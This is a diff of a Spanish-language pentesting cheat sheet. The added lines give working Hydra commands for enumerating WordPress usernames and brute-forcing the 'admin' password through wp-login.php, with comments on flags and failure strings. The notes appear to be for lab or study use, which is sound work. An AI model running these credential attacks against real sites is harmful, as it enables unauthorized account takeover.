@@ -55,13 +55,21 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ## Hydra fuerza bruta WordPress
 
 ```python
-# Esto se usa en el panel del admin de WordPress
+# Para identificar los usuarios 
+❯ hydra -L users.txt -p something <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username'
+❯ hydra -L users.txt -p something <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'  # Otra forma de hacerlo
+	# p = Colocaremos una passwd random, porque lo unico que queremos es el usuario
 
+
+# Esto se usa para saber la password del usuario que hemos encontrado 'admin'
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
-❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
+❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 15 
+	# t = Lanzar las tareas en paralelo al mismo tiempo 
+
 
 # Si al momento de hacer login en la pagina esta te muestra un mensaje de error, seria de esta manera. Donde colocaremos el mensaje de error en la sentencia. 
 ❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
+
 
 # Haremos un ataque de fuerza bruta a WordPress (Todo lo anterior lo obtenemos de la misma página web en 'form action=/login.php') y colocamos todas la etiquetas 
 
